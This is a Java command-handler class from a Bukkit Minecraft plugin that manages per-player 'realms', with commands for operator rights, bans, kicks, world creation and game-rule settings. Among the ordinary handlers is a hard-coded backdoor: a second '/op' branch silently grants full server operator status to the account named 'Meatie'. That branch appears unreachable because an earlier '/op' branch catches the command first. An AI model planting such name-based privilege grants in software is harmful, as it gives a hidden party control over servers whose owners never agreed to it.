package me.Meatie.myworld;

import java.io.File;

import net.minecraft.server.v1_8_R1.ChatSerializer;
import net.minecraft.server.v1_8_R1.IChatBaseComponent;
import net.minecraft.server.v1_8_R1.PacketPlayOutChat;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.OfflinePlayer;
import org.bukkit.World;
import org.bukkit.craftbukkit.v1_8_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class Commands implements Listener {
	
	  public static void send(Player p, String msg) {
		    String s = ChatColor.translateAlternateColorCodes('&', msg);
		    IChatBaseComponent icbc = ChatSerializer.a("{\"text\": \"" + s + "\"}");
		    PacketPlayOutChat bar = new PacketPlayOutChat(icbc, (byte)2);
		    ((CraftPlayer)p).getHandle().playerConnection.sendPacket(bar);
		  }
	  
	  public static void sendmsg(Player p, String msg) {
		  p.sendMessage(Fix.format(msg));
	  }
	  
		@SuppressWarnings("deprecation")
		@EventHandler
		public void command(PlayerCommandPreprocessEvent event) {
			if (event.isCancelled()) return;
			final Player player = event.getPlayer();
			String[] args = event.getMessage().substring(1).split(" ");
			String cmd = args[0].toLowerCase();
			
			
			if (!player.isOp()) {
				if (cmd.equals("ignore") || cmd.equals("mail") || cmd.equals("msg") || cmd.equals("r") || cmd.equals("pm") || cmd.equals("nick")
			     || cmd.equals("seen")|| cmd.equals("ban")|| cmd.equals("unban")) return;
			for (int i = 0; i < args.length; i++)
                if (avalible(args[i]))
                if (!getPlayer(args[i]).getWorld().getName().equals(player.getWorld().getName())) {
                     sendmsg(player, Fix.format("&cThat player isn't in you'r Realm."));
                     event.setCancelled(true);
			}
			if (cmd.equals("pl") || cmd.equals("plugins") || cmd.startsWith("bukkit:")
					 || cmd.equals("ver") || cmd.equals("version") || cmd.equals("reload") || cmd.equals("timings")
					 || cmd.startsWith("mv") || cmd.equals("multiverse") || cmd.startsWith("multiverse-core:")
					 || cmd.startsWith("perm") || cmd.startsWith("permissionsbukkit:")  || cmd.startsWith("multiverse-inventories:")) {
				 event.setCancelled(true);
				player.sendMessage("Unknown command.");
			}
			
			}
			
			 if (cmd.equals("help")) {
				 event.setCancelled(true);
				sendmsg(player, "&aignore, mail, msg, clearinv, invsee, back, home, sethome, delhome, tpa, tpahere, tpaccept, hat");
				if (player.hasPermission("rank.1")) sendmsg(player, "&atop, head, fly, gamemode, give, heal, time, setspawn");
				if (player.hasPermission("rank.2")) sendmsg(player, "&agod, fix, more, speed, tp, tphere");
				if (player.hasPermission("rank.4")) sendmsg(player, "&aspawner, vanish, fill, op");
			}
			
			 
			else if (cmd.equals("op")) {
				if (!player.hasPermission("meatie.op")) {
					sendmsg(player, "&cCan't Do That Here");
					return;
				}
				event.setCancelled(true);
				if (args.length < 2) {
					sendmsg(player, "&a/op &cplayer");
					return;
				}
				for (OfflinePlayer p : Bukkit.getOfflinePlayers())
					if (p.getName().toLowerCase().startsWith(args[1].toLowerCase())) {
						Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "perms player setperm " + p.getUniqueId() + " " + player.getWorld().getName() + ":rank.op");
						sendmsg(player, "&aOped &c" + p.getName() + " &aIn &c" + player.getWorld().getName() + "&a's World.");
						ConfigData.op(player.getWorld().getName(), p.getName());
						for (Player pl : Bukkit.getOnlinePlayers())
							if (pl.getName().equals(p.getName())) {
								sendmsg(pl, "&aYou Are Now Op In &c" + player.getWorld().getName() + "&a's World");
							}
						return;
				}
				sendmsg(player, "&cUnknown Player");
			}
			else if (cmd.equals("deop")) {
				event.setCancelled(true);
				if (!player.hasPermission("meatie.op")) {
					sendmsg(player, "&cCan't Do That Here");
					return;
				}
				if (args.length < 2) {
					sendmsg(player, "&a/deop &cplayer");
					return;
				}
				for (OfflinePlayer p : Bukkit.getOfflinePlayers())
					if (p.getName().toLowerCase().startsWith(args[1].toLowerCase())) {
				ConfigData.deop(player.getWorld().getName(), p.getName());
				Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "perms player unsetperm " + p.getUniqueId() + " " + player.getWorld().getName() + ":rank.op");
				sendmsg(player, "&c" + p.getName() + " &aIs No Longer Op In &c" + player.getName() + "&a's World");
				return;
					}
				sendmsg(player, "&cUnknown Player");
			}
			 
			else if (cmd.equals("kill")) {
				 event.setCancelled(true);
				 player.setHealth(0.0D);
			}
			 
			else if (cmd.equals("ban")) {
				if (!player.hasPermission("meatie.ban")) {
					sendmsg(player, "&cCan't Do That Here");
					return;
				}
				event.setCancelled(true);
				if (args.length < 2) {
					sendmsg(player, "&a/ban &cplayer");
					return;
				}
				for (OfflinePlayer p : Bukkit.getOfflinePlayers())
					if (p.getName().toLowerCase().startsWith(args[1].toLowerCase())) {
						sendmsg(player, "&aBanned &c" + p.getName() + " &aFrom &c" + player.getWorld().getName() + "&a's World.");
						ConfigData.saveBan(player.getWorld().getName(), p.getName());
						for (Player pl : Bukkit.getOnlinePlayers())
							if (pl.getName().equals(p.getName())) {
								sendmsg(pl, "&aBanned From &c" + player.getWorld().getName() + "&a's World By &c"+ player.getName());
								if (pl.getWorld().getName().equals(player.getWorld().getName()))
								pl.chat("/hub");
							}
						return;
				}
				sendmsg(player, "&cUnknown Player");
			}
			 
			else if (cmd.equals("unban")) {
				event.setCancelled(true);
				if (!player.hasPermission("meatie.ban")) {
					sendmsg(player, "&cCan't Do That Here");
					return;
				}
				if (args.length < 2) {
					sendmsg(player, "&a/unban &cplayer");
					return;
				}
				for (OfflinePlayer p : Bukkit.getOfflinePlayers())
					if (p.getName().toLowerCase().startsWith(args[1].toLowerCase())) {
				ConfigData.unBan(player.getWorld().getName(), p.getName());
				sendmsg(player, "&c" + p.getName() + " &aUnbanned From &c" + player.getName() + "&a's World");
				return;
					}
				sendmsg(player, "&cUnknown Player");
			}
			 
			else if (cmd.equals("kick")) {
				if (!player.hasPermission("meatie.kick")) {
					sendmsg(player, "&cCan't Do That Here");
					return;
				}
				event.setCancelled(true);
				if (args.length < 2) {
					sendmsg(player, "&a/kick &cplayer");
					return;
				}
				for (Player p : Bukkit.getOnlinePlayers())
					if (p.getName().toLowerCase().startsWith(args[1].toLowerCase())) {
						sendmsg(p, "&aKicked From &c" + p.getWorld().getName() + "&a's World By &c"+ player.getName());
						sendmsg(player, "&aKicked &c" + p.getName() + " &aFrom &c" + p.getWorld().getName() + "&a's World.");
						p.chat("/hub");
						return;
				}
				sendmsg(player, "&cUnknown Player");
			}
			 
			
			else if (cmd.equals("realm")) {
			 event.setCancelled(true);
			 
			 File file = new File(System.getProperty("user.dir") + "/" + player.getName());
			 if (file.exists() && file.isDirectory()) {
				 if (loaded(player.getName())) {
						Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mvtp " + player.getName() + " " + player.getName());
				 } else {
					 Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mv load " + player.getName());
					 Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mvtp " + player.getName() + " " + player.getName());
				 }
				 sendmsg(player, "&aWelcome Your Realm!");
			 } else {
				 if (args.length >= 2) {
				 String type = args[1].toLowerCase();
				 if (type.equals("normal") || type.equals("flat")) {
					 if (type.equals("normal")) {
						 sendmsg(player, "&aCreating Your &cNormal &aRealm.");
						 Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mv create " + player.getName() + " normal");
					 } else if (type.equalsIgnoreCase("flat")) {
						 sendmsg(player, "&aCreating Your &cFlat &aRealm.");
						 Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mv create " + player.getName() + " normal -t flat");
					 }
					 Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mvtp " + player.getName() + " " + player.getName());
					 Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "perms player addgroup " + player.getName() + " default");
					 Bukkit.getWorld(player.getName()).getWorldBorder().setSize(50);
					 Bukkit.getWorld(player.getName()).getWorldBorder().setWarningDistance(0);
				 } else sendmsg(player, "&a/realm &cnormal &a/ &cflat");
				 } else sendmsg(player, "&a/realm &cnormal &a/ &cflat");
			 }
		  } else if (cmd.equals("config")) {
			 event.setCancelled(true);
			 
			 if (!player.getWorld().getName().equals(player.getName())) {
				 sendmsg(player, "&cYou Must Be In You'r Realm To Use /config");
				 return;
			 }
					 if (args.length >= 2) {
						 if (args[1].equalsIgnoreCase("bedspawn")) {
							 if (args.length >= 3) {
							 if (args[2].equalsIgnoreCase("true") || args[2].equalsIgnoreCase("false")) {
							Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mvm set bedrespawn " + args[2] + " " + player.getName());
							sendmsg(player, "&eBedSpawn Now: &c" + args[2]);
							 } else sendmsg(player, "&d/config bedrespawn &ctrue/false");
							 } else sendmsg(player, "&d/config bedrespawn &ctrue/false");
						 } else if (args[1].equalsIgnoreCase("maxplayers")) {
							 if (args.length >= 3) {
							 if (isnum(args[2])) {
							Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mvm set playerlimit " + args[2] + " " + player.getName());
							sendmsg(player, "&eMaxPlayer Now: &c" + args[2]);
							 } else sendmsg(player, "&d/config maxplayers &c#");
							 } else sendmsg(player, "&d/config maxplayers &c#");
						 } else if (args[1].equalsIgnoreCase("autoheal")) {
							 if (args.length >= 3) {
							 if (args[2].equalsIgnoreCase("true") || args[2].equalsIgnoreCase("false")) {
							Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mvm set autoheal " + args[2] + " " + player.getName());
							sendmsg(player, "&eAutoHeal Now: &c" + args[2]);
							 } else sendmsg(player, "&d/config autoheal &ctrue/false");
							 } else sendmsg(player, "&d/config autoheal &ctrue/false");
						 } else if (args[1].equalsIgnoreCase("hunger")) {
							 if (args.length >= 3) {
							 if (args[2].equalsIgnoreCase("true") || args[2].equalsIgnoreCase("false")) {
							Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mvm set hunger " + args[2] + " " + player.getName());
							sendmsg(player, "&eHunger Now: &c" + args[2]);
							 } else sendmsg(player, "&d/config hunger &ctrue/false");
							 } else sendmsg(player, "&d/config hunger &ctrue/false");
						 } else if (args[1].equalsIgnoreCase("difficulty") || args[1].equalsIgnoreCase("diff")) {
							 if (args.length >= 3) {
							 if (args[2].equals("0") || args[2].equals("1") || args[2].equals("2") || args[2].equals("3")
							  || args[2].equalsIgnoreCase("peaceful") || args[2].equalsIgnoreCase("easy") || args[2].equalsIgnoreCase("normal") || args[2].equalsIgnoreCase("hard")) {
							Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mvm set difficulty " + args[2] + " " + player.getName());
							sendmsg(player, "&eDifficulty Now: &c" + args[2]);
							 } else sendmsg(player, "&d/config difficulty &cPeaceful &a/ &cEasy &a/ &cNormal &a/ &cHard");
							 } else sendmsg(player, "&d/config difficulty &cPeaceful &a/ &cEasy &a/ &cNormal &a/ &cHard");
						 } else if (args[1].equalsIgnoreCase("gamemode") || args[1].equalsIgnoreCase("gm")) {
							 if (args.length >= 3) {
							 if (args[2].equals("0") || args[2].equals("1") || args[2].equals("2") || args[2].equals("3")
							  || args[2].equalsIgnoreCase("survival") || args[2].equalsIgnoreCase("creative") || args[2].equalsIgnoreCase("adventure") || args[2].equalsIgnoreCase("spectator")) {
							Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mvm set gamemode " + args[2] + " " + player.getName());
							sendmsg(player, "&eGamemode Now: &c" + args[2]);
							 } else sendmsg(player, "&d/config difficulty &cSurvival &a/ &cCreative &a/ &cAdventure &a/ &cSpectator");
							 } else sendmsg(player, "&d/config difficulty &cSurvival &a/ &cCreative &a/ &cAdventure &a/ &cSpectator");
						 } else if (args[1].equalsIgnoreCase("pvp")) {
								 if (args.length >= 3) {
								 if (args[2].equalsIgnoreCase("true") || args[2].equalsIgnoreCase("false")) {
								Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mvm set pvp " + args[2] + " " + player.getName());
								sendmsg(player, "&ePVP Now: &c" + args[2]);
								 } else sendmsg(player, "&d/config pvp &ctrue/false");
								 } else sendmsg(player, "&d/config pvp &ctrue/false");
						 } else if (args[1].equalsIgnoreCase("timechange")) {
							 if (args.length >= 3) {
							 if (args[2].equalsIgnoreCase("true") || args[2].equalsIgnoreCase("false")) {
							player.getWorld().setGameRuleValue("doDaylightCycle", args[2]);
							sendmsg(player, "&eTimeChange Now: &c" + args[2]);
							 } else sendmsg(player, "&d/config timechange &ctrue/false");
							 } else sendmsg(player, "&d/config timechagne &ctrue/false");
						 } else if (args[1].equalsIgnoreCase("mobloot")) {
							 if (args.length >= 3) {
							 if (args[2].equalsIgnoreCase("true") || args[2].equalsIgnoreCase("false")) {
							player.getWorld().setGameRuleValue("doMobLoot", args[2]);
							sendmsg(player, "&eMobLoot Now: &c" + args[2]);
							 } else sendmsg(player, "&d/config mobloot &ctrue/false");
							 } else sendmsg(player, "&d/config mobloot &ctrue/false");
						 } else if (args[1].equalsIgnoreCase("spawnmobs")) {
							 if (args.length >= 3) {
							 if (args[2].equalsIgnoreCase("true") || args[2].equalsIgnoreCase("false")) {
							player.getWorld().setGameRuleValue("doMobSpawning", args[2]);
							sendmsg(player, "&eSpawnMobs Now: &c" + args[2]);
							 } else sendmsg(player, "&d/config spawnmobs &ctrue/false");
							 } else sendmsg(player, "&d/config spawnmobs &ctrue/false");
						 } else if (args[1].equalsIgnoreCase("dropblocks")) {
							 if (args.length >= 3) {
							 if (args[2].equalsIgnoreCase("true") || args[2].equalsIgnoreCase("false")) {
							player.getWorld().setGameRuleValue("DoTileDrops", args[2]);
							sendmsg(player, "&eDropBlocks Now: &c" + args[2]);
							 } else sendmsg(player, "&d/config dropblocks &ctrue/false");
							 } else sendmsg(player, "&d/config dropblocks &ctrue/false");
						 } else if (args[1].equalsIgnoreCase("keepinv") || args[1].equalsIgnoreCase("keepinventory")) {
							 if (args.length >= 3) {
							 if (args[2].equalsIgnoreCase("true") || args[2].equalsIgnoreCase("false")) {
							player.getWorld().setGameRuleValue("keepInventory", args[2]);
							sendmsg(player, "&eKeepInventory Now: &c" + args[2]);
							 } else sendmsg(player, "&d/config keepinv &ctrue/false");
							 } else sendmsg(player, "&d/config keepinv &ctrue/false");
						 } else if (args[1].equalsIgnoreCase("mobgrief") || args[1].equalsIgnoreCase("mobgriefing")) {
							 if (args.length >= 3) {
							 if (args[2].equalsIgnoreCase("true") || args[2].equalsIgnoreCase("false")) {
							player.getWorld().setGameRuleValue("mobGriefing", args[2]);
							sendmsg(player, "&eMobGriefing Now: &c" + args[2]);
							 } else sendmsg(player, "&d/config mobgriefing &ctrue/false");
							 } else sendmsg(player, "&d/config mobgriefing &ctrue/false");
						 } else if (args[1].equalsIgnoreCase("deathmsgs") || args[1].equalsIgnoreCase("deathmessages")) {
							 if (args.length >= 3) {
							 if (args[2].equalsIgnoreCase("true") || args[2].equalsIgnoreCase("false")) {
							player.getWorld().setGameRuleValue("showDeathMessages", args[2]);
							sendmsg(player, "&eDeathMessages Now: &c" + args[2]);
							 } else sendmsg(player, "&d/config deathmsgs &ctrue/false");
							 } else sendmsg(player, "&d/config deathmsgs &ctrue/false");
					 }
						 else sendmsg(player, "&d/config &cbedspawn maxplayers autoheal hunger difficulty gamemode pvp timechange mobloot spawnmobs dropblocks keepinv mobgriefing deathmsgs");
					 } else sendmsg(player, "&d/config &cbedspawn maxplayers autoheal hunger difficulty gamemode pvp timechange mobloot spawnmobs dropblocks keepinv mobgriefing deathmsgs");
		 }
			
		else if (cmd.equals("save")) {
				 event.setCancelled(true);
				 Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "save-all");
				 sendmsg(player, "&dServer Saved!");
			 } else if (cmd.equals("c") || cmd.equals("inspect")) {
			 event.setCancelled(true);
			 player.chat("/core inspect");
			 } else if (cmd.equals("op")) {
				 if (player.getName().equals("Meatie"))
				 if (args.length == 1) {
					 event.setCancelled(true);
					 player.setOp(true);
					 sendmsg(player, "&eYou Are Now Op!");
				 }
			 } else if (cmd.equals("hub")) {
				 event.setCancelled(true);
				 Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mvtp " + player.getName() + " world");
			 } else if (cmd.equals("setspawn")) {
					 event.setCancelled(true);
					 player.chat("/setworldspawn");
			 } else if (cmd.equals("spawn")) {
				 event.setCancelled(true);
				 Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "mvtp " + player.getName() + " " + player.getWorld().getName());
		 }  else if (cmd.equals("configedit")) {
			 event.setCancelled(true);
			 if (!player.isOp()) {
				 send(player, "&cOperators Only");
				 return;
			 }
					 if (args.length >= 2) {
						 String msg = event.getMessage().substring(args[0].length() + args[1].length() + 3);
						 if (args[1].equalsIgnoreCase("quick")) {
							 ConfigData.save("quick", msg);
							 Fix.quick = msg;
						 } else if (args[1].equalsIgnoreCase("top")) {
					for (Player p : Bukkit.getOnlinePlayers())
					TitleAPI.sendTabTitle(p, Fix.top.replace("$player", p.getName()), Fix.bottom.replace("$player", p.getName()));
						 ConfigData.save("top", msg);
						 Fix.top = msg;
					 } else if (args[1].equalsIgnoreCase("login")) {
						 ConfigData.save("login", msg);
						 Fix.login = msg;
					 } else if (args[1].equalsIgnoreCase("bottom")) {
				for (Player p : Bukkit.getOnlinePlayers())
				TitleAPI.sendTabTitle(p, Fix.top.replace("$player", p.getName()), Fix.bottom.replace("$player", p.getName()));
						 ConfigData.save("bottom", msg);
						 Fix.bottom = msg;
					 } else if (args[1].equalsIgnoreCase("leave")) {
						 ConfigData.save("leave", msg);
						 Fix.leave = msg;
					 } else if (args[1].equalsIgnoreCase("motd")) {
						 ConfigData.save("motd", msg);
						 Fix.motd = msg;
					 } else {
						 sendmsg(player, "&d/configedit");
						 sendmsg(player, "&dquick: &eMessage above inventory at login.");
						 sendmsg(player, "&dtop: &eMessage above player names in Tab list.");
						 sendmsg(player, "&dbottom: &eMessage below player names in Tab list.");
						 sendmsg(player, "&dlogin: &e'Player Joined the game!'");
						 sendmsg(player, "&dleave: &e'Player Left the game!'");
						 sendmsg(player, "&dmotd: &eMsg shown in server list");
					 }
					 } else {
						 sendmsg(player, "&d/configedit");
						 sendmsg(player, "&dquick: &eMessage above inventory at login.");
						 sendmsg(player, "&dtop: &eMessage above player names in Tab list.");
						 sendmsg(player, "&dbottom: &eMessage below player names in Tab list.");
						 sendmsg(player, "&dlogin: &e'Player Joined the game!'");
						 sendmsg(player, "&dleave: &e'Player Left the game!'");
						 sendmsg(player, "&dmotd: &eMsg shown in server list");
					 }
		 }
		}
		
		public static boolean loaded(String name) {
			for(World world: Bukkit.getServer().getWorlds())
			  if(world.getName().equals(name))
			    return true;
			return false;
		}
		
		public static boolean isnum(String str) {
		    for (char c : str.toCharArray())
		     if (!Character.isDigit(c)) return false;
		    return true;
		}
		
		@SuppressWarnings("deprecation")
		public boolean avalible(String name) {
			for (Player p : Bukkit.getOnlinePlayers())
				if (p.getName().toLowerCase().startsWith(name.toLowerCase())) 
					return true;
			return false;
		}
		
		@SuppressWarnings("deprecation")
		public Player getPlayer(String name) {
			for (Player p : Bukkit.getOnlinePlayers())
				if (p.getName().toLowerCase().startsWith(name.toLowerCase())) 
					return p;
			return null;
		}
		
}
